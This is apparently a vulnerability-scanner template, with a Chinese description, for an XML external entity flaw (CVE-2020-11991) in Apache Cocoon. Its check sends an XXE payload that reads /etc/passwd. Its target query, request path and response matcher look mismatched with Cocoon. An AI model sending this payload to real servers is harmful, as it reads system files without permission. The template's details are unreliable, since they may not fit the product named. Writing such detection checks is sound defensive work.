app: Apache Cocoon
query: title:"Dspace Home"
meta:
  name: Apache Cocoon Xml 注入 CVE-2020-11991
  level: 3
  tags:
    - xxe
  description: |-
    CVE-2020-11991 与 StreamGenerator 有关，在使用 StreamGenerator 时，代码将解析用户提供的 xml。攻击者可以使用包括外部系统实体在内的特制 xml 来访问服务器系统上的任何文件。
    Apache Cocoon <= 2.1.12
  homepage: http://cocoon.apache.org/2.1/
  author: 一曲成殇
  references: ""
  solution: ""
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: POST
            path: /go-ora/api/product/manger/getInfo
            redirect: true
            header: [ ]
            params: <!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY ent SYSTEM
              \"file:///etc/passwd\"> ]>\n<userInfo>\n<firstName>John</firstName> \n<lastName>&ent;</lastName>\n</userInfo>
          response:
            - name: code
              value: "200"
              type: equals
            - name: body
              value: root
              type: equals
  create_at: "2021-10-15 15:36:48"
